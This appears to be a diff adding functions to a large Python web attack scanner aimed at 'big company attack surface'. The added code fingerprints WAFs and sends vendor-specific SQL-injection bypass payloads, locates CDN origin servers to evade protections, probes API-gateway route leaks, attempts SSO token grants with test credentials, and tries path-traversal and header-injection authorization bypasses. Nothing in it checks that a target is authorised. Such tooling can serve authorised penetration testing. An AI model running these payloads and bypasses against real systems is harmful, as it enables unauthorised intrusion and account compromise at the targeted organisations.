@@ -17981,3 +17981,331 @@ def scan_unicode_normalization(crawl_data, web_targets):
             except Exception:
                 continue
     return findings
+
+
+# ---------------------------------------------------------------------------
+# Enterprise-grade: Big company attack surface — WAF bypass, CDN origin, 
+# microservices, API gateways, cloud infra, SSO chains
+# ---------------------------------------------------------------------------
+
+def scan_waf_fingerprint_bypass(web_targets):
+    """Fingerprint the exact WAF and use known bypasses for that specific WAF."""
+    findings = []
+    waf_signatures = {
+        "Cloudflare": {"headers": ["cf-ray", "cf-cache-status"], "body": ["cloudflare"], "bypasses": [
+            "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
+            "%u0027 OR 1=1--",  # Unicode encoding
+        ]},
+        "AWS WAF": {"headers": ["x-amzn-requestid"], "body": ["aws"], "bypasses": [
+            "/*!50000 UNION*/ SELECT",
+            "1'%20or%20'1'%3D'1",
+        ]},
+        "Akamai": {"headers": ["x-akamai-transformed"], "body": ["akamai"], "bypasses": [
+            "%00' OR 1=1--",
+            "1'/**/OR/**/1=1--",
+        ]},
+        "Imperva/Incapsula": {"headers": ["x-iinfo", "x-cdn"], "body": ["incapsula"], "bypasses": [
+            "1' /*!OR*/ 1=1--",
+        ]},
+        "F5 BIG-IP": {"headers": ["x-wa-info", "bigipserver"], "body": [], "bypasses": [
+            "1'%20oR%201%3D1--%20",
+        ]},
+        "ModSecurity": {"headers": [], "body": ["mod_security", "modsecurity"], "bypasses": [
+            "1'%0AOR%0A1=1--",
+            "1'%09OR%091=1--",
+        ]},
+    }
+
+    for target in web_targets[:3]:
+        try:
+            # Trigger WAF with obvious attack
+            r_attack = _S.get(f"{target}?id=1' OR 1=1--", timeout=_TIMEOUT)
+            r_normal = _S.get(target, timeout=_TIMEOUT)
+
+            # Fingerprint WAF
+            detected_waf = None
+            all_headers = " ".join(f"{k}: {v}" for k, v in r_attack.headers.items()).lower()
+            for waf_name, sig in waf_signatures.items():
+                if any(h in all_headers for h in sig["headers"]):
+                    detected_waf = waf_name
+                    break
+                if any(b in r_attack.text.lower() for b in sig["body"]):
+                    detected_waf = waf_name
+                    break
+
+            if detected_waf:
+                # Try WAF-specific bypasses
+                bypasses = waf_signatures[detected_waf]["bypasses"]
+                for bypass in bypasses:
+                    test_url = f"{target}?id={urllib.parse.quote(bypass)}"
+                    r_bypass = _S.get(test_url, timeout=_TIMEOUT)
+                    if r_bypass.status_code != r_attack.status_code:
+                        if r_bypass.status_code == 200 or r_bypass.status_code != 403:
+                            findings.append({
+                                "type": f"WAF Bypass ({detected_waf})",
+                                "severity": "high",
+                                "url": test_url,
+                                "detail": f"Detected {detected_waf}. Bypass payload gets through: {bypass[:50]}",
+                                "template": "apex-waf-bypass",
+                            })
+                            break
+        except Exception:
+            continue
+    return findings
+
+
+def scan_cdn_origin_bypass(web_targets, subdomains):
+    """Find the origin server behind CDN — bypass all CDN-level protections."""
+    findings = []
+    import socket
+
+    for target in web_targets[:3]:
+        parsed = urllib.parse.urlparse(target)
+        hostname = parsed.hostname
+
+        # Technique 1: Check for origin in common subdomains
+        origin_prefixes = ["origin", "direct", "backend", "real", "server",
+                           "origin-www", "www-origin", "old", "legacy", "staging"]
+        base_domain = ".".join(hostname.split(".")[-2:])
+
+        origin_candidates = [f"{prefix}.{base_domain}" for prefix in origin_prefixes]
+
+        for candidate in origin_candidates:
+            try:
+                ip = socket.gethostbyname(candidate)
+                # Try connecting directly to origin
+                r = _S.get(f"https://{candidate}", timeout=5, headers={"Host": hostname})
+                if r.status_code == 200 and len(r.text) > 100:
+                    findings.append({
+                        "type": "CDN Origin Server Exposed",
+                        "severity": "high",
+                        "url": f"https://{candidate}",
+                        "detail": f"Origin server at {candidate} ({ip}) accessible directly. Bypasses CDN WAF/rate limits.",
+                        "template": "apex-cdn-origin",
+                    })
+                    break
+            except Exception:
+                continue
+
+        # Technique 2: Check historical DNS records via SecurityTrails-style
+        # Check if any subdomain resolves to a non-CDN IP
+        cdn_ranges = ["104.16.", "104.17.", "104.18.", "104.19.", "104.20.",  # Cloudflare
+                      "13.32.", "13.33.", "13.35.",  # CloudFront
+                      "151.101.",  # Fastly
+                      "199.27."]  # Incapsula
+        for sub in subdomains[:20]:
+            try:
+                ip = socket.gethostbyname(sub)
+                if not any(ip.startswith(r) for r in cdn_ranges):
+                    # This subdomain might be the origin
+                    r = _S.get(f"https://{sub}", timeout=5, headers={"Host": hostname})
+                    if r.status_code == 200:
+                        findings.append({
+                            "type": "Potential Origin IP via Subdomain",
+                            "severity": "medium",
+                            "url": f"https://{sub}",
+                            "detail": f"Subdomain {sub} resolves to non-CDN IP {ip}. May be origin server.",
+                            "template": "apex-cdn-origin-sub",
+                        })
+                        break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_microservice_discovery(crawl_data, web_targets):
+    """Discover internal microservices via API gateway misconfigurations."""
+    findings = []
+    # Common API gateway paths that leak internal service info
+    gateway_paths = [
+        "/actuator/gateway/routes",  # Spring Cloud Gateway
+        "/api/routes",  # Kong
+        "/__routes",  # Custom
+        "/api/v1/services",  # K8s service discovery
+        "/.well-known/apollo/server-health",  # Apollo GraphQL
+        "/api/system/services",
+        "/internal/services",
+        "/debug/routes",
+        "/admin/api/routes",
+    ]
+
+    for target in web_targets[:5]:
+        base = target.rstrip("/")
+        urls = [f"{base}{p}" for p in gateway_paths]
+        for url, r in batch_get(urls, timeout=5):
+            if r and r.status_code == 200 and len(r.text) > 50:
+                if any(x in r.text.lower() for x in ["service", "route", "upstream",
+                                                       "backend", "endpoint", "host"]):
+                    try:
+                        services = r.json() if "json" in r.headers.get("content-type", "") else r.text[:500]
+                    except Exception:
+                        services = r.text[:500]
+                    findings.append({
+                        "type": "Internal Microservice Discovery",
+                        "severity": "high",
+                        "url": url,
+                        "detail": f"API gateway exposes internal service routes. Can access internal services directly.",
+                        "template": "apex-microservice-discovery",
+                    })
+                    break
+    return findings
+
+
+def scan_sso_chain_attack(crawl_data, web_targets):
+    """SSO chain attack — exploit trust between services sharing the same SSO."""
+    findings = []
+
+    for target in web_targets[:5]:
+        base = target.rstrip("/")
+        # Find SSO/SAML/OAuth endpoints
+        sso_paths = ["/.well-known/openid-configuration", "/saml/metadata",
+                     "/oauth/.well-known/openid-configuration", "/auth/realms/master",
+                     "/.auth/login/aad", "/adfs/ls"]
+
+        for path in sso_paths:
+            try:
+                r = _S.get(f"{base}{path}", timeout=_TIMEOUT_SHORT)
+                if r.status_code == 200:
+                    # Found SSO config — check for misconfigurations
+                    if "openid-configuration" in path:
+                        try:
+                            config = r.json()
+                            # Check if token endpoint is accessible
+                            token_ep = config.get("token_endpoint", "")
+                            if token_ep:
+                                # Try client_credentials grant (often misconfigured)
+                                r2 = _S.post(token_ep, data={
+                                    "grant_type": "client_credentials",
+                                    "client_id": "test",
+                                    "client_secret": "test"
+                                }, timeout=_TIMEOUT_SHORT)
+                                if r2.status_code == 200 and "access_token" in r2.text:
+                                    findings.append({
+                                        "type": "SSO Token Endpoint — Client Credentials Without Auth",
+                                        "severity": "critical",
+                                        "url": token_ep,
+                                        "detail": "Token endpoint issues tokens with test credentials. Full SSO bypass.",
+                                        "template": "apex-sso-token-bypass",
+                                    })
+                        except Exception:
+                            pass
+
+                    # Check for SAML metadata with signing cert (can forge assertions)
+                    if "saml" in path and "X509Certificate" in r.text:
+                        findings.append({
+                            "type": "SAML Metadata Exposed (Signing Certificate)",
+                            "severity": "medium",
+                            "url": f"{base}{path}",
+                            "detail": "SAML metadata with signing certificate exposed. May enable assertion forgery.",
+                            "template": "apex-saml-metadata",
+                        })
+            except Exception:
+                continue
+    return findings
+
+
+def scan_api_gateway_exploit(crawl_data, web_targets):
+    """API gateway exploitation — path traversal, method override, header injection."""
+    findings = []
+
+    for target in web_targets[:5]:
+        base = target.rstrip("/")
+
+        # Technique 1: Path traversal through API gateway
+        # Many gateways route /api/public/* but /api/public/../admin/* bypasses
+        traversal_tests = [
+            ("/api/public/../admin", "/api/admin"),
+            ("/api/v1/public/..%2fadmin", "/api/v1/admin"),
+            ("/api/v1/users/..;/admin", "/api/admin"),
+            ("/api%2f..%2fadmin", "/admin"),
+        ]
+        for bypass_path, target_path in traversal_tests:
+            try:
+                r_bypass = _S.get(f"{base}{bypass_path}", timeout=_TIMEOUT_SHORT)
+                r_direct = _S.get(f"{base}{target_path}", timeout=_TIMEOUT_SHORT)
+                if r_direct.status_code in (401, 403) and r_bypass.status_code == 200:
+                    if len(r_bypass.text) > 100:
+                        findings.append({
+                            "type": "API Gateway Path Traversal Bypass",
+                            "severity": "critical",
+                            "url": f"{base}{bypass_path}",
+                            "detail": f"Gateway blocks {target_path} (403) but {bypass_path} returns 200. Auth bypass via path confusion.",
+                            "template": "apex-gateway-traversal",
+                        })
+                        break
+            except Exception:
+                continue
+
+        # Technique 2: Internal header injection
+        internal_headers = [
+            ("X-Forwarded-For", "127.0.0.1"),
+            ("X-Real-IP", "127.0.0.1"),
+            ("X-Original-URL", "/admin"),
+            ("X-Rewrite-URL", "/admin"),
+            ("X-Forwarded-Host", "internal.company.com"),
+            ("X-Forwarded-Prefix", "/admin"),
+        ]
+        for header, value in internal_headers:
+            try:
+                r = _S.get(base, headers={header: value}, timeout=_TIMEOUT_SHORT)
+                if r.status_code == 200 and "admin" in r.text.lower():
+                    findings.append({
+                        "type": f"API Gateway Header Bypass ({header})",
+                        "severity": "high",
+                        "url": base,
+                        "detail": f"Header '{header}: {value}' changes routing. Internal endpoints accessible.",
+                        "template": "apex-gateway-header",
+                    })
+                    break
+            except Exception:
+                continue
+    return findings
+
+
+def scan_cloud_infra_enum(target, web_targets):
+    """Enumerate cloud infrastructure — find S3, Lambda, API Gateway, CloudFront distributions."""
+    findings = []
+    import socket
+
+    # AWS infrastructure patterns
+    aws_checks = [
+        (f"{target}.s3.amazonaws.com", "S3 Bucket"),
+        (f"{target}.s3-website-us-east-1.amazonaws.com", "S3 Website"),
+        (f"api.{target}", "API Gateway"),
+    ]
+
+    for hostname, service in aws_checks:
+        try:
+            socket.gethostbyname(hostname)
+            r = _S.get(f"https://{hostname}", timeout=5)
+            if r.status_code != 404:
+                findings.append({
+                    "type": f"Cloud Infrastructure: {service}",
+                    "severity": "medium",
+                    "url": f"https://{hostname}",
+                    "detail": f"AWS {service} found at {hostname}. Status: {r.status_code}",
+                    "template": "apex-cloud-infra",
+                })
+        except Exception:
+            continue
+
+    # Check for exposed AWS API Gateway stages
+    for web_target in web_targets[:3]:
+        if "execute-api" in web_target or "amazonaws" in web_target:
+            # Try common stage names
+            parsed = urllib.parse.urlparse(web_target)
+            base = f"{parsed.scheme}://{parsed.netloc}"
+            for stage in ["prod", "dev", "staging", "test", "v1", "api"]:
+                try:
+                    r = _S.get(f"{base}/{stage}/", timeout=_TIMEOUT_SHORT)
+                    if r.status_code == 200 and len(r.text) > 50:
+                        findings.append({
+                            "type": f"AWS API Gateway Stage: /{stage}",
+                            "severity": "medium",
+                            "url": f"{base}/{stage}/",
+                            "detail": f"API Gateway stage '/{stage}' accessible. May have different auth than production.",
+                            "template": "apex-aws-apigw-stage",
+                        })
+                except Exception:
+                    continue
+    return findings
